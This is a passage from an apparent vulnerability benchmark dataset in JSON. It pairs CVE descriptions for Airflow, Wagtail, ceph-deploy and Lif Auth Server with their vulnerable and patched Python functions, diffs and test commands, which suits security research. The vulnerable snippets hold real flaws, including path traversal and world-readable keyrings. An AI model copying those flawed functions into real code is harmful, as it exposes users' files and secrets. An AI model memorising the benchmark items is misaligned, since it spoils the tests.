'https://airflow.apache.org/docs/{}'.format(version.version)\n\n            appbuilder.add_link(\"Documentation\",\n                                href=airflow_doc_site,\n                                category=\"Docs\",\n                                category_icon=\"fa-cube\")\n            appbuilder.add_link(\"GitHub\",\n                                href='https://github.com/apache/airflow',\n                                category=\"Docs\")\n            appbuilder.add_view(views.VersionView,\n                                'Version',\n                                category='About',\n                                category_icon='fa-th')\n\n            def integrate_plugins():\n                \"\"\"Integrate plugins to the context\"\"\"\n                from airflow.plugins_manager import (\n                    flask_appbuilder_views, flask_appbuilder_menu_links\n                )\n\n                for v in flask_appbuilder_views:\n                    log.debug(\"Adding view %s\", v[\"name\"])\n                    appbuilder.add_view(v[\"view\"],\n                                        v[\"name\"],\n                                        category=v[\"category\"])\n                for ml in sorted(flask_appbuilder_menu_links, key=lambda x: x[\"name\"]):\n                    log.debug(\"Adding menu link %s\", ml[\"name\"])\n                    appbuilder.add_link(ml[\"name\"],\n                                        href=ml[\"href\"],\n                                        category=ml[\"category\"],\n                                        category_icon=ml[\"category_icon\"])\n\n            integrate_plugins()\n            # Garbage collect old permissions/views after they have been modified.\n            # Otherwise, when the name of a view or menu is changed, the framework\n            # will add the new Views and Menus names to the backend, but will not\n            # delete the old ones.\n\n        def init_plugin_blueprints(app):\n            from airflow.plugins_manager import flask_blueprints\n\n            for bp in flask_blueprints:\n                log.debug(\"Adding blueprint %s:%s\", bp[\"name\"], bp[\"blueprint\"].import_name)\n                app.register_blueprint(bp[\"blueprint\"])\n\n        init_views(appbuilder)\n        init_plugin_blueprints(app)\n\n        if conf.getboolean('webserver', 'UPDATE_FAB_PERMS'):\n            security_manager = appbuilder.sm\n            security_manager.sync_roles()\n\n        from airflow.www_rbac.api.experimental import endpoints as e\n        # required for testing purposes otherwise the module retains\n        # a link to the default_auth\n        if app.config['TESTING']:\n            if six.PY2:\n                reload(e) # noqa\n            else:\n                import importlib\n                importlib.reload(e)\n\n        app.register_blueprint(e.api_experimental, url_prefix='/api/experimental')\n\n        server_timezone = conf.get('core', 'default_timezone')\n        if server_timezone == \"system\":\n            server_timezone = pendulum.local_timezone().name\n        elif server_timezone == \"utc\":\n            server_timezone = \"UTC\"\n\n        default_ui_timezone = conf.get('webserver', 'default_ui_timezone')\n        if default_ui_timezone == \"system\":\n            default_ui_timezone = pendulum.local_timezone().name\n        elif default_ui_timezone == \"utc\":\n            default_ui_timezone = \"UTC\"\n        if not default_ui_timezone:\n            default_ui_timezone = server_timezone\n\n        @app.context_processor\n        def jinja_globals():  # pylint: disable=unused-variable\n\n            globals = {\n                'server_timezone': server_timezone,\n                'default_ui_timezone': default_ui_timezone,\n                'hostname': socket.getfqdn() if conf.getboolean(\n                    'webserver', 'EXPOSE_HOSTNAME', fallback=True) else 'redact',\n                'navbar_color': conf.get('webserver', 'NAVBAR_COLOR'),\n                'log_fetch_delay_sec': conf.getint(\n                    'webserver', 'log_fetch_delay_sec', fallback=2),\n                'log_auto_tailing_offset': conf.getint(\n                    'webserver', 'log_auto_tailing_offset', fallback=30),\n                'log_animation_speed': conf.getint(\n                    'webserver', 'log_animation_speed', fallback=1000),\n                'state_color_mapping': STATE_COLORS\n            }\n\n            if 'analytics_tool' in conf.getsection('webserver'):\n                globals.update({\n                    'analytics_tool': conf.get('webserver', 'ANALYTICS_TOOL'),\n                    'analytics_id': conf.get('webserver', 'ANALYTICS_ID')\n                })\n\n            return globals\n\n        @app.teardown_appcontext\n        def shutdown_session(exception=None):\n            settings.Session.remove()\n\n        @app.after_request\n        def apply_caching(response):\n            _x_frame_enabled = conf.getboolean('webserver', 'X_FRAME_ENABLED', fallback=True)\n            if not _x_frame_enabled:\n                response.headers[\"X-Frame-Options\"] = \"DENY\"\n            return response\n\n        @app.before_request\n        def make_session_permanent():\n            flask_session.permanent = True\n\n    return app, appbuilder"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_89_1",
        "commit": "a8900fa",
        "file_path": "airflow/www_rbac/app.py",
        "start_line": "51",
        "end_line": "286",
        "snippet": "def create_app(config=None, session=None, testing=False, app_name=\"Airflow\"):\n    global app, appbuilder\n    app = Flask(__name__)\n    if conf.getboolean('webserver', 'ENABLE_PROXY_FIX'):\n        app.wsgi_app = ProxyFix(\n            app.wsgi_app,\n            num_proxies=conf.get(\"webserver\", \"PROXY_FIX_NUM_PROXIES\", fallback=None),\n            x_for=conf.getint(\"webserver\", \"PROXY_FIX_X_FOR\", fallback=1),\n            x_proto=conf.getint(\"webserver\", \"PROXY_FIX_X_PROTO\", fallback=1),\n            x_host=conf.getint(\"webserver\", \"PROXY_FIX_X_HOST\", fallback=1),\n            x_port=conf.getint(\"webserver\", \"PROXY_FIX_X_PORT\", fallback=1),\n            x_prefix=conf.getint(\"webserver\", \"PROXY_FIX_X_PREFIX\", fallback=1)\n        )\n    app.secret_key = conf.get('webserver', 'SECRET_KEY')\n    app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=settings.get_session_lifetime_config())\n\n    if conf.get('webserver', 'SECRET_KEY') == \"temporary_key\":\n        app.secret_key = os.urandom(16)\n    else:\n        app.secret_key = conf.get('webserver', 'SECRET_KEY')\n\n    app.config.from_pyfile(settings.WEBSERVER_CONFIG, silent=True)\n    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\n    app.config['APP_NAME'] = app_name\n    app.config['TESTING'] = testing\n\n    app.config['SESSION_COOKIE_HTTPONLY'] = True\n    app.config['SESSION_COOKIE_SECURE'] = conf.getboolean('webserver', 'COOKIE_SECURE')\n    app.config['SESSION_COOKIE_SAMESITE'] = conf.get('webserver', 'COOKIE_SAMESITE')\n\n    if config:\n        app.config.from_mapping(config)\n\n    if 'SQLALCHEMY_ENGINE_OPTIONS' not in app.config:\n        app.config['SQLALCHEMY_ENGINE_OPTIONS'] = settings.prepare_engine_args()\n\n    csrf.init_app(app)\n\n    db = SQLA(app)\n\n    from airflow import api\n    api.load_auth()\n    api.API_AUTH.api_auth.init_app(app)\n\n    # flake8: noqa: F841\n    cache = Cache(app=app, config={'CACHE_TYPE': 'filesystem', 'CACHE_DIR': '/tmp'})\n\n    from airflow.www_rbac.blueprints import routes\n    app.register_blueprint(routes)\n\n    configure_logging()\n    configure_manifest_files(app)\n\n    with app.app_context():\n        from airflow.www_rbac.security import AirflowSecurityManager\n        security_manager_class = app.config.get('SECURITY_MANAGER_CLASS') or \\\n            AirflowSecurityManager\n\n        if not issubclass(security_manager_class, AirflowSecurityManager):\n            raise Exception(\n                \"\"\"Your CUSTOM_SECURITY_MANAGER must now extend AirflowSecurityManager,\n                 not FAB's security manager.\"\"\")\n\n        appbuilder = AppBuilder(\n            app,\n            db.session if not session else session,\n            security_manager_class=security_manager_class,\n            base_template='airflow/master.html',\n            update_perms=conf.getboolean('webserver', 'UPDATE_FAB_PERMS'))\n\n        def init_views(appbuilder):\n            from airflow.www_rbac import views\n            # Remove the session from scoped_session registry to avoid\n            # reusing a session with a disconnected connection\n            appbuilder.session.remove()\n            appbuilder.add_view_no_menu(views.Airflow())\n            appbuilder.add_view_no_menu(views.DagModelView())\n            appbuilder.add_view(views.DagRunModelView,\n                                \"DAG Runs\",\n                                category=\"Browse\",\n                                category_icon=\"fa-globe\")\n            appbuilder.add_view(views.JobModelView,\n                                \"Jobs\",\n                                category=\"Browse\")\n            appbuilder.add_view(views.LogModelView,\n                                \"Logs\",\n                                category=\"Browse\")\n            appbuilder.add_view(views.SlaMissModelView,\n                                \"SLA Misses\",\n                                category=\"Browse\")\n            appbuilder.add_view(views.TaskInstanceModelView,\n                                \"Task Instances\",\n                                category=\"Browse\")\n            appbuilder.add_view(views.TaskRescheduleModelView,\n                                \"Task Reschedules\",\n                                category=\"Browse\")\n            appbuilder.add_view(views.ConfigurationView,\n                                \"Configurations\",\n                                category=\"Admin\",\n                                category_icon=\"fa-user\")\n            appbuilder.add_view(views.ConnectionModelView,\n                                \"Connections\",\n                                category=\"Admin\")\n            appbuilder.add_view(views.PoolModelView,\n                                \"Pools\",\n                                category=\"Admin\")\n            appbuilder.add_view(views.VariableModelView,\n                                \"Variables\",\n                                category=\"Admin\")\n            appbuilder.add_view(views.XComModelView,\n                                \"XComs\",\n                                category=\"Admin\")\n\n            if \"dev\" in version.version:\n                airflow_doc_site = \"https://airflow.readthedocs.io/en/latest\"\n            else:\n                airflow_doc_site = 'https://airflow.apache.org/docs/{}'.format(version.version)\n\n            appbuilder.add_link(\"Documentation\",\n                                href=airflow_doc_site,\n                                category=\"Docs\",\n                                category_icon=\"fa-cube\")\n            appbuilder.add_link(\"GitHub\",\n                                href='https://github.com/apache/airflow',\n                                category=\"Docs\")\n            appbuilder.add_view(views.VersionView,\n                                'Version',\n                                category='About',\n                                category_icon='fa-th')\n\n            def integrate_plugins():\n                \"\"\"Integrate plugins to the context\"\"\"\n                from airflow.plugins_manager import (\n                    flask_appbuilder_views, flask_appbuilder_menu_links\n                )\n\n                for v in flask_appbuilder_views:\n                    log.debug(\"Adding view %s\", v[\"name\"])\n                    appbuilder.add_view(v[\"view\"],\n                                        v[\"name\"],\n                                        category=v[\"category\"])\n                for ml in sorted(flask_appbuilder_menu_links, key=lambda x: x[\"name\"]):\n                    log.debug(\"Adding menu link %s\", ml[\"name\"])\n                    appbuilder.add_link(ml[\"name\"],\n                                        href=ml[\"href\"],\n                                        category=ml[\"category\"],\n                                        category_icon=ml[\"category_icon\"])\n\n            integrate_plugins()\n            # Garbage collect old permissions/views after they have been modified.\n            # Otherwise, when the name of a view or menu is changed, the framework\n            # will add the new Views and Menus names to the backend, but will not\n            # delete the old ones.\n\n        def init_plugin_blueprints(app):\n            from airflow.plugins_manager import flask_blueprints\n\n            for bp in flask_blueprints:\n                log.debug(\"Adding blueprint %s:%s\", bp[\"name\"], bp[\"blueprint\"].import_name)\n                app.register_blueprint(bp[\"blueprint\"])\n\n        init_views(appbuilder)\n        init_plugin_blueprints(app)\n\n        if conf.getboolean('webserver', 'UPDATE_FAB_PERMS'):\n            security_manager = appbuilder.sm\n            security_manager.sync_roles()\n\n        from airflow.www_rbac.api.experimental import endpoints as e\n        # required for testing purposes otherwise the module retains\n        # a link to the default_auth\n        if app.config['TESTING']:\n            if six.PY2:\n                reload(e) # noqa\n            else:\n                import importlib\n                importlib.reload(e)\n\n        app.register_blueprint(e.api_experimental, url_prefix='/api/experimental')\n\n        server_timezone = conf.get('core', 'default_timezone')\n        if server_timezone == \"system\":\n            server_timezone = pendulum.local_timezone().name\n        elif server_timezone == \"utc\":\n            server_timezone = \"UTC\"\n\n        default_ui_timezone = conf.get('webserver', 'default_ui_timezone')\n        if default_ui_timezone == \"system\":\n            default_ui_timezone = pendulum.local_timezone().name\n        elif default_ui_timezone == \"utc\":\n            default_ui_timezone = \"UTC\"\n        if not default_ui_timezone:\n            default_ui_timezone = server_timezone\n\n        @app.context_processor\n        def jinja_globals():  # pylint: disable=unused-variable\n\n            globals = {\n                'server_timezone': server_timezone,\n                'default_ui_timezone': default_ui_timezone,\n                'hostname': socket.getfqdn() if conf.getboolean(\n                    'webserver', 'EXPOSE_HOSTNAME', fallback=True) else 'redact',\n                'navbar_color': conf.get('webserver', 'NAVBAR_COLOR'),\n                'log_fetch_delay_sec': conf.getint(\n                    'webserver', 'log_fetch_delay_sec', fallback=2),\n                'log_auto_tailing_offset': conf.getint(\n                    'webserver', 'log_auto_tailing_offset', fallback=30),\n                'log_animation_speed': conf.getint(\n                    'webserver', 'log_animation_speed', fallback=1000),\n                'state_color_mapping': STATE_COLORS\n            }\n\n            if 'analytics_tool' in conf.getsection('webserver'):\n                globals.update({\n                    'analytics_tool': conf.get('webserver', 'ANALYTICS_TOOL'),\n                    'analytics_id': conf.get('webserver', 'ANALYTICS_ID')\n                })\n\n            return globals\n\n        @app.teardown_appcontext\n        def shutdown_session(exception=None):\n            settings.Session.remove()\n\n        @app.after_request\n        def apply_caching(response):\n            _x_frame_enabled = conf.getboolean('webserver', 'X_FRAME_ENABLED', fallback=True)\n            if not _x_frame_enabled:\n                response.headers[\"X-Frame-Options\"] = \"DENY\"\n            return response\n\n        @app.before_request\n        def make_session_permanent():\n            flask_session.permanent = True\n\n    return app, appbuilder"
      }
    ],
    "vul_patch": "--- a/airflow/www_rbac/app.py\n+++ b/airflow/www_rbac/app.py\n@@ -14,6 +14,11 @@\n     app.secret_key = conf.get('webserver', 'SECRET_KEY')\n     app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=settings.get_session_lifetime_config())\n \n+    if conf.get('webserver', 'SECRET_KEY') == \"temporary_key\":\n+        app.secret_key = os.urandom(16)\n+    else:\n+        app.secret_key = conf.get('webserver', 'SECRET_KEY')\n+\n     app.config.from_pyfile(settings.WEBSERVER_CONFIG, silent=True)\n     app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\n     app.config['APP_NAME'] = app_name\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-45809",
    "cve_description": "Wagtail is an open source content management system built on Django. A user with a limited-permission editor account for the Wagtail admin can make a direct URL request to the admin view that handles bulk actions on user accounts. While authentication rules prevent the user from making any changes, the error message discloses the display names of user accounts, and by modifying URL parameters, the user can retrieve the display name for any user. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin. Patched versions have been released as Wagtail 4.1.8 (LTS), 5.0.5 and 5.1.3. The fix is also included in Release Candidate 1 of the forthcoming Wagtail 5.2 release. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-532": {
        "name": "Insertion of Sensitive Information into Log File",
        "description": "The product writes sensitive information to a log file."
      }
    },
    "repo": "https://github.com/wagtail/wagtail",
    "patch_url": [
      "https://github.com/wagtail/wagtail/commit/bc96aed6ac53f998b2f4c4bf97e2d4f5fe337e5b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_70_1",
        "commit": "190af78",
        "file_path": "wagtail/users/views/bulk_actions/user_bulk_action.py",
        "start_line": 6,
        "end_line": 8,
        "snippet": "class UserBulkAction(BulkAction):\n    models = [get_user_model()]"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_70_1",
        "commit": "bc96aed6ac53f998b2f4c4bf97e2d4f5fe337e5b",
        "file_path": "wagtail/users/views/bulk_actions/user_bulk_action.py",
        "start_line": 8,
        "end_line": 14,
        "snippet": "User = get_user_model()\n\n\nclass UserBulkAction(PermissionCheckedMixin, BulkAction):\n    models = [User]\n    permission_policy = ModelPermissionPolicy(User)\n    any_permission_required = [\"add\", \"change\", \"delete\"]"
      }
    ],
    "vul_patch": "--- a/wagtail/users/views/bulk_actions/user_bulk_action.py\n+++ b/wagtail/users/views/bulk_actions/user_bulk_action.py\n@@ -1,3 +1,7 @@\n+User = get_user_model()\n \n-class UserBulkAction(BulkAction):\n-    models = [get_user_model()]\n+\n+class UserBulkAction(PermissionCheckedMixin, BulkAction):\n+    models = [User]\n+    permission_policy = ModelPermissionPolicy(User)\n+    any_permission_required = [\"add\", \"change\", \"delete\"]\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-45809:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/wagtail\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-45809/bin/python runtests.py wagtail.users.tests.test_bulk_actions.test_bulk_delete.TestUserDeleteView.test_user_permissions_required\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-45809:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/wagtail\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-45809/bin/python runtests.py wagtail.users.tests.test_bulk_actions.test_bulk_delete\n"
  },
  {
    "cve_id": "CVE-2015-3010",
    "cve_description": "ceph-deploy before 1.5.23 uses weak permissions (644) for ceph/ceph.client.admin.keyring, which allows local users to obtain sensitive information by reading the file.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/ceph/ceph-deploy",
    "patch_url": [
      "https://github.com/ceph/ceph-deploy/commit/eee56770393bf19ed2dd5389226c6190c08dee3f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_228_1",
        "commit": "764d6e3",
        "file_path": "ceph_deploy/gatherkeys.py",
        "start_line": 32,
        "end_line": 76,
        "snippet": "def gatherkeys(args):\n    # client.admin\n    keyring = '/etc/ceph/{cluster}.client.admin.keyring'.format(\n        cluster=args.cluster)\n    r = fetch_file(\n        args=args,\n        frompath=keyring,\n        topath='{cluster}.client.admin.keyring'.format(\n            cluster=args.cluster),\n        _hosts=args.mon,\n        )\n    if not r:\n        raise exc.KeyNotFoundError(keyring, args.mon)\n\n    # mon.\n    keyring = '/var/lib/ceph/mon/{cluster}-{{hostname}}/keyring'.format(\n        cluster=args.cluster)\n    r = fetch_file(\n        args=args,\n        frompath=keyring,\n        topath='{cluster}.mon.keyring'.format(cluster=args.cluster),\n        _hosts=args.mon,\n        )\n    if not r:\n        raise exc.KeyNotFoundError(keyring, args.mon)\n\n    # bootstrap\n    for what in ['osd', 'mds', 'rgw']:\n        keyring = '/var/lib/ceph/bootstrap-{what}/{cluster}.keyring'.format(\n            what=what,\n            cluster=args.cluster)\n        r = fetch_file(\n            args=args,\n            frompath=keyring,\n            topath='{cluster}.bootstrap-{what}.keyring'.format(\n                cluster=args.cluster,\n                what=what),\n            _hosts=args.mon,\n            )\n        if not r:\n            if what in ['osd', 'mds']:\n                raise exc.KeyNotFoundError(keyring, args.mon)\n            else:\n                LOG.warning((\"No RGW bootstrap key found. Will not be able to \"\n                             \"deploy RGW daemons\"))"
      },
      {
        "id": "vul_py_228_2",
        "commit": "764d6e3",
        "file_path": "ceph_deploy/new.py",
        "start_line": 207,
        "end_line": 225,
        "snippet": "def new_mon_keyring(args):\n    LOG.debug('Creating a random mon key...')\n    mon_keyring = '[mon.]\\nkey = %s\\ncaps mon = allow *\\n' % generate_auth_key()\n\n    keypath = '{name}.mon.keyring'.format(\n        name=args.cluster,\n        )\n\n    LOG.debug('Writing monitor keyring to %s...', keypath)\n    tmp = '%s.tmp' % keypath\n    with file(tmp, 'w') as f:\n        f.write(mon_keyring)\n    try:\n        os.rename(tmp, keypath)\n    except OSError as e:\n        if e.errno == errno.EEXIST:\n            raise exc.ClusterExistsError(keypath)\n        else:\n            raise"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_228_1",
        "commit": "eee5677",
        "file_path": "ceph_deploy/gatherkeys.py",
        "start_line": 32,
        "end_line": 80,
        "snippet": "def gatherkeys(args):\n    oldmask = os.umask(077)\n    try:\n        # client.admin\n        keyring = '/etc/ceph/{cluster}.client.admin.keyring'.format(\n            cluster=args.cluster)\n        r = fetch_file(\n            args=args,\n            frompath=keyring,\n            topath='{cluster}.client.admin.keyring'.format(\n                cluster=args.cluster),\n            _hosts=args.mon,\n            )\n        if not r:\n            raise exc.KeyNotFoundError(keyring, args.mon)\n\n        # mon.\n        keyring = '/var/lib/ceph/mon/{cluster}-{{hostname}}/keyring'.format(\n            cluster=args.cluster)\n        r = fetch_file(\n            args=args,\n            frompath=keyring,\n            topath='{cluster}.mon.keyring'.format(cluster=args.cluster),\n            _hosts=args.mon,\n            )\n        if not r:\n            raise exc.KeyNotFoundError(keyring, args.mon)\n\n        # bootstrap\n        for what in ['osd', 'mds', 'rgw']:\n            keyring = '/var/lib/ceph/bootstrap-{what}/{cluster}.keyring'.format(\n                what=what,\n                cluster=args.cluster)\n            r = fetch_file(\n                args=args,\n                frompath=keyring,\n                topath='{cluster}.bootstrap-{what}.keyring'.format(\n                    cluster=args.cluster,\n                    what=what),\n                _hosts=args.mon,\n                )\n            if not r:\n                if what in ['osd', 'mds']:\n                    raise exc.KeyNotFoundError(keyring, args.mon)\n                else:\n                    LOG.warning((\"No RGW bootstrap key found. Will not be able to \"\n                                 \"deploy RGW daemons\"))\n    finally:\n        os.umask(oldmask)"
      },
      {
        "id": "fix_py_228_2",
        "commit": "eee5677",
        "file_path": "ceph_deploy/new.py",
        "start_line": 207,
        "end_line": 228,
        "snippet": "def new_mon_keyring(args):\n    LOG.debug('Creating a random mon key...')\n    mon_keyring = '[mon.]\\nkey = %s\\ncaps mon = allow *\\n' % generate_auth_key()\n\n    keypath = '{name}.mon.keyring'.format(\n        name=args.cluster,\n        )\n    oldmask = os.umask(077)\n    LOG.debug('Writing monitor keyring to %s...', keypath)\n    try:\n        tmp = '%s.tmp' % keypath\n        with open(tmp, 'w', 0600) as f:\n            f.write(mon_keyring)\n        try:\n            os.rename(tmp, keypath)\n        except OSError as e:\n            if e.errno == errno.EEXIST:\n                raise exc.ClusterExistsError(keypath)\n            else:\n                raise\n    finally:\n        os.umask(oldmask)"
      }
    ],
    "vul_patch": "--- a/ceph_deploy/gatherkeys.py\n+++ b/ceph_deploy/gatherkeys.py\n@@ -1,45 +1,49 @@\n def gatherkeys(args):\n-    # client.admin\n-    keyring = '/etc/ceph/{cluster}.client.admin.keyring'.format(\n-        cluster=args.cluster)\n-    r = fetch_file(\n-        args=args,\n-        frompath=keyring,\n-        topath='{cluster}.client.admin.keyring'.format(\n-            cluster=args.cluster),\n-        _hosts=args.mon,\n-        )\n-    if not r:\n-        raise exc.KeyNotFoundError(keyring, args.mon)\n-\n-    # mon.\n-    keyring = '/var/lib/ceph/mon/{cluster}-{{hostname}}/keyring'.format(\n-        cluster=args.cluster)\n-    r = fetch_file(\n-        args=args,\n-        frompath=keyring,\n-        topath='{cluster}.mon.keyring'.format(cluster=args.cluster),\n-        _hosts=args.mon,\n-        )\n-    if not r:\n-        raise exc.KeyNotFoundError(keyring, args.mon)\n-\n-    # bootstrap\n-    for what in ['osd', 'mds', 'rgw']:\n-        keyring = '/var/lib/ceph/bootstrap-{what}/{cluster}.keyring'.format(\n-            what=what,\n+    oldmask = os.umask(077)\n+    try:\n+        # client.admin\n+        keyring = '/etc/ceph/{cluster}.client.admin.keyring'.format(\n             cluster=args.cluster)\n         r = fetch_file(\n             args=args,\n             frompath=keyring,\n-            topath='{cluster}.bootstrap-{what}.keyring'.format(\n-                cluster=args.cluster,\n-                what=what),\n+            topath='{cluster}.client.admin.keyring'.format(\n+                cluster=args.cluster),\n             _hosts=args.mon,\n             )\n         if not r:\n-            if what in ['osd', 'mds']:\n-                raise exc.KeyNotFoundError(keyring, args.mon)\n-            else:\n-                LOG.warning((\"No RGW bootstrap key found. Will not be able to \"\n-                             \"deploy RGW daemons\"))\n+            raise exc.KeyNotFoundError(keyring, args.mon)\n+\n+        # mon.\n+        keyring = '/var/lib/ceph/mon/{cluster}-{{hostname}}/keyring'.format(\n+            cluster=args.cluster)\n+        r = fetch_file(\n+            args=args,\n+            frompath=keyring,\n+            topath='{cluster}.mon.keyring'.format(cluster=args.cluster),\n+            _hosts=args.mon,\n+            )\n+        if not r:\n+            raise exc.KeyNotFoundError(keyring, args.mon)\n+\n+        # bootstrap\n+        for what in ['osd', 'mds', 'rgw']:\n+            keyring = '/var/lib/ceph/bootstrap-{what}/{cluster}.keyring'.format(\n+                what=what,\n+                cluster=args.cluster)\n+            r = fetch_file(\n+                args=args,\n+                frompath=keyring,\n+                topath='{cluster}.bootstrap-{what}.keyring'.format(\n+                    cluster=args.cluster,\n+                    what=what),\n+                _hosts=args.mon,\n+                )\n+            if not r:\n+                if what in ['osd', 'mds']:\n+                    raise exc.KeyNotFoundError(keyring, args.mon)\n+                else:\n+                    LOG.warning((\"No RGW bootstrap key found. Will not be able to \"\n+                                 \"deploy RGW daemons\"))\n+    finally:\n+        os.umask(oldmask)\n\n--- a/ceph_deploy/new.py\n+++ b/ceph_deploy/new.py\n@@ -5,15 +5,18 @@\n     keypath = '{name}.mon.keyring'.format(\n         name=args.cluster,\n         )\n-\n+    oldmask = os.umask(077)\n     LOG.debug('Writing monitor keyring to %s...', keypath)\n-    tmp = '%s.tmp' % keypath\n-    with file(tmp, 'w') as f:\n-        f.write(mon_keyring)\n     try:\n-        os.rename(tmp, keypath)\n-    except OSError as e:\n-        if e.errno == errno.EEXIST:\n-            raise exc.ClusterExistsError(keypath)\n-        else:\n-            raise\n+        tmp = '%s.tmp' % keypath\n+        with open(tmp, 'w', 0600) as f:\n+            f.write(mon_keyring)\n+        try:\n+            os.rename(tmp, keypath)\n+        except OSError as e:\n+            if e.errno == errno.EEXIST:\n+                raise exc.ClusterExistsError(keypath)\n+            else:\n+                raise\n+    finally:\n+        os.umask(oldmask)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-49801",
    "cve_description": "Lif Auth Server is a server for validating logins, managing information, and account recovery for Lif Accounts. The issue relates to the `get_pfp` and `get_banner` routes on Auth Server. The issue is that there is no check to ensure that the file that Auth Server is receiving through these URLs is correct. This could allow an attacker access to files they shouldn't have access to. This issue has been patched in version 1.4.0.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/Lif-Platforms/Lif-Auth-Server",
    "patch_url": [
      "https://github.com/Lif-Platforms/Lif-Auth-Server/commit/c235bcc2ee65e4a0dfb10284cf2cbc750213efeb"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_382_1",
        "commit": "ffb704bf417213afc59cab9d74e5da0a5ead2a93",
        "file_path": "src/auth_server.py",
        "start_line": 335,
        "end_line": 351,
        "snippet": "async def get_pfp(username: str):\n    \"\"\"\n    ## Get User Avatar (Profile Picture)\n    Allows services to get the avatar (profile picture) of a specified account. \n    \n    ### Parameters:\n    - **username (str):** The username for the account.\n\n    ### Returns:\n    - **file:** The avatar the service requested.\n    \"\"\"\n    # Checks if the user has a profile pic uploaded\n    if os.path.isfile(f\"user_images/pfp/{username}\"):\n        return FileResponse(f\"user_images/pfp/{username}\", media_type='image/gif')\n    else:\n        # Returns default image if none is uploaded\n        return FileResponse(f'{assets_folder}/default_pfp.png', media_type='image/gif')"
      },
      {
        "id": "vul_py_382_2",
        "commit": "ffb704bf417213afc59cab9d74e5da0a5ead2a93",
        "file_path": "src/auth_server.py",
        "start_line": 354,
        "end_line": 370,
        "snippet": "async def get_banner(username: str):\n    \"\"\"\n    ## Get User Banner\n    Allows services to get the account banner of a specified account.\n    \n    ### Parameters:\n    - **username (str):** The username for the account.\n\n    ### Returns:\n    - **file:** The banner the service requested.\n    \"\"\"\n    # Checks if the user has a profile pic uploaded\n    if os.path.isfile(f\"user_images/banner/{username}\"):\n        return FileResponse(f\"user_images/banner/{username}\", media_type='image/gif')\n    else:\n        # Returns default image if none is uploaded\n        return FileResponse(f'{assets_folder}/default_banner.png', media_type='image/gif')"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_382_1",
        "commit": "c235bcc2ee65e4a0dfb10284cf2cbc750213efeb",
        "file_path": "src/auth_server.py",
        "start_line": 335,
        "end_line": 359,
        "snippet": "async def get_pfp(username: str):\n    \"\"\"\n    ## Get User Avatar (Profile Picture)\n    Allows services to get the avatar (profile picture) of a specified account. \n    \n    ### Parameters:\n    - **username (str):** The username for the account.\n\n    ### Returns:\n    - **file:** The avatar the service requested.\n    \"\"\"\n    # Sanitize and validate the username variable (Example: alphanumeric characters allowed)\n    if not username.isalnum():\n        # Handle invalid input (username contains non-alphanumeric characters)\n        return FileResponse(f'{assets_folder}/default_pfp.png', media_type='image/gif')\n\n    # Construct the file path using the sanitized username\n    banner_path = f\"user_images/pfp/{username}\"\n\n    # Check if the file exists and is a regular file\n    if os.path.isfile(banner_path):\n        return FileResponse(banner_path, media_type='image/gif')\n    else:\n        # Return default image if the user's banner doesn't exist\n        return FileResponse(f'{assets_folder}/default_pfp.png', media_type='image/gif')"
      },
      {
        "id": "fix_py_382_2",
        "commit": "c235bcc2ee65e4a0dfb10284cf2cbc750213efeb",
        "file_path": "src/auth_server.py",
        "start_line": 362,
        "end_line": 386,
        "snippet": "async def get_banner(username: str):\n    \"\"\"\n    ## Get User Banner\n    Allows services to get the account banner of a specified account.\n    \n    ### Parameters:\n    - **username (str):** The username for the account.\n\n    ### Returns:\n    - **file:** The banner the service requested.\n    \"\"\"\n    # Sanitize and validate the username variable (Example: alphanumeric characters allowed)\n    if not username.isalnum():\n        # Handle invalid input (username contains non-alphanumeric characters)\n        return FileResponse(f'{assets_folder}/default_banner.png', media_type='image/gif')\n\n    # Construct the file path using the sanitized username\n    banner_path = f\"user_images/banner/{username}\"\n\n    # Check if the file exists and is a regular file\n    if os.path.isfile(banner_path):\n        return FileResponse(banner_path, media_type='image/gif')\n    else:\n        # Return default image if the user's banner doesn't exist\n        return FileResponse(f'{assets_folder}/default_banner.png', media_type='image/gif')"
      }
    ],
